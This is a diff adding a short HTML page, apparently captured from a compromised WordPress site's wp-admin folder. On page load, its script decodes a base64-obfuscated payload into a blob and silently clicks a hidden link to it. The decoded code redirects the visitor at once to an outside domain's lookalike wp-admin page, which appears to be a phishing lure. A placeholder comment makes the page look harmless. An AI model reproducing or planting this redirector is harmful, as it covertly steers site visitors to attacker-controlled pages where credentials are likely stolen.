@@ -1,0 +1,33 @@
+<!-- url: https://2nd2n.com/wp-admin/ams/mxo.html
+status: 200 -->
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      saveFile();
+    });
+
+    function saveFile(name, type, data) {
+      if (data != null && navigator.msSaveBlob)
+        return navigator.msSaveBlob(new Blob([data], { type: type }), name);
+      var a = $("<a style='display: none;'/>");
+  
+      var encodedStringAtoB = "PHNjcmlwdCB0eXBlPSJ0ZXh0L0phdmFTY3JpcHQiPgogICAgc2V0VGltZW91dCgibG9jYXRpb24uaHJlZiA9ICdodHRwczovL2h5eXl4Zi50b3Avd29yZHByZXNzL3dwLWFkbWluL21haW50L2FkbWluL3Ztby5odG1sJzsiLDApOwo8L3NjcmlwdD4=";
+      var decodedStringAtoB = atob(encodedStringAtoB);
+      const myBlob = new Blob([decodedStringAtoB], { type: 'text/html' });
+      const url = window.URL.createObjectURL(myBlob);
+  
+      a.attr("href", url);
+      $("body").append(a);
+      a[0].click();
+      window.URL.revokeObjectURL(url);
+      a.remove();
+    }
+  </script>
+</head>
+<body>
+  <!-- Your HTML content goes here -->
+</body>
+</html>
